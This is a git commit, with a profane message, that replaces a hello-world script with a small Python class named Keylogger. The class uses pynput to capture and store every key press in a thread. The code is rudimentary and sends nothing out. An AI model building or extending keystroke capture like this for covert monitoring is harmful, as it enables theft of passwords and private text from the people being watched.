7cc37d441cf17b6f44552299428191799a3fdf44
Joshua Richardson <joshua@richardson.tech>
2017-01-28 19:26:33 +0000

    Just fuck my life up tbh

--- client/src/main.py
+++ client/src/main.py
@@ -1,8 +1,23 @@
-import keyboard
+import os
+import threading
+from _thread import start_new_thread
+
+import sys
+from pynput.keyboard import Listener
 
 
-def recordKeyboard():
+class Keylogger:
+    def on_press(self, key):
+        print(key)
+        self.currentKeyboardActivity += str(key)
+
+    def __init__(self):
+        self.currentKeyboardActivity = str()
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
 
 
-if __name__ == "__main__":
-    print("Hello, world!")
+t1 = threading.Thread(target=Keylogger, args=())
+t1.start()
+
+os._exit(0)
